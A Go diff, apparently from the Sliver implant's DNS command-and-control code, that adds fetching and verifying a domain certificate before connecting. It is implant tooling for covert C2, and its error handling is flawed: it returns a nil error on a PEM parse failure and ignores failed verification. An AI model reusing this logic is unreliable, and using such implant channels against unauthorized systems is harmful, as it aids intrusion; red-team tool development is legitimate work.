@@ -2,6 +2,7 @@ package main
 
 import (
 	"crypto/x509"
+	"encoding/pem"
 	"flag"
 	"io"
 	"os"
@@ -138,7 +139,24 @@ func dnsConnect() error {
 	log.Printf("Attempting to connect via DNS via parent: %s\n", dnsParent)
 	// {{end}}
 
-	LookupDomainKey(sliverName, dnsParent)
+	pubKeyPEM, err := LookupDomainKey(sliverName, dnsParent)
+	if err != nil {
+		log.Printf("Failed to fetch domain key %v", err)
+		return err
+	}
+
+	block, _ := pem.Decode([]byte(pubKeyPEM))
+	if block == nil {
+		log.Printf("failed to parse certificate PEM")
+		return err
+	}
+
+	err = rootOnlyVerifyCertificate([][]byte{block.Bytes}, [][]*x509.Certificate{})
+	if err == nil {
+		log.Printf("Valid & trusted certificate")
+	} else {
+		log.Printf("Invalid certificate %v", err)
+	}
 
 	return nil
 }
